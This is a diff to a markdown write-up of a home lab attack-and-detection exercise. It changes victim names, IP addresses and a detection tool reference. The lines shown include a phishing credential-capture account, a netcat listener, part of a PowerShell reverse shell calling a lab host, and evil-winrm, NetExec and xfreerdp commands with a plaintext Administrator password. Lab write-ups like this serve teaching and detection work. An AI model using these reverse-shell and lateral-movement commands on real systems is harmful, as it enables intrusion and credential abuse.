@@ -41,13 +41,13 @@ A fake login page was deployed to mimic the corporate login portal. The phishing
 
 **How it worked:**
 1. Phishing website cloned/created to mimic a corporate login page
-2. Email sent to victim (`johnd@corp.project-x.com`) via MailHog
+2. Email sent to victim (`janed@corp.project-x.com`) via MailHog
 3. Victim visited the link and entered their credentials
 4. Credentials were captured server-side by the attacker
 
 **Captured credentials:**
 ```
-Username: johnd
+Username: jane
 Password: @password123!
 ```
 
@@ -67,8 +67,8 @@ nc -lvnp 4444
 
 **PowerShell reverse shell (delivered to victim):**
 ```powershell
-# See scripts/reverse-shell.ps1
-$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP", 4444)
+# See scripts/reverse-shell/reverse.ps1
+$client = New-Object System.Net.Sockets.TCPClient("10.0.0.9", 4444)
 $stream = $client.GetStream()
 [byte[]]$bytes = 0..65535 | %{0}
 while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
@@ -110,7 +110,7 @@ hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
 
 **Using Evil-WinRM for post-exploitation:**
 ```bash
-evil-winrm -i 10.0.0.100 -u Administrator -p '@Deeboodah1!'
+evil-winrm -i 10.0.0.5 -u Administrator -p '@Deeboodah1!'
 ```
 
 **Using NetExec to enumerate and execute across the network:**
@@ -124,7 +124,7 @@ nxc smb 10.0.0.5 -u Administrator -p '@Deeboodah1!' -x "whoami"
 
 **Using XFreeRDP for GUI access:**
 ```bash
-xfreerdp /u:Administrator /p:'@Deeboodah1!' /v:10.0.0.100
+xfreerdp /u:Administrator /p:'@Deeboodah1!' /v:10.0.0.5
 ```
 
 ---
@@ -140,7 +140,7 @@ With Administrator credentials and access to the Domain Controller (`10.0.0.5`),
 
 ## Phase 7 — Detection (Blue Team)
 
-**Objective:** Identify what Wazuh and Security Onion detected.
+**Objective:** Identify what Wazuh detected.
 
 ### Wazuh Alerts Generated
 
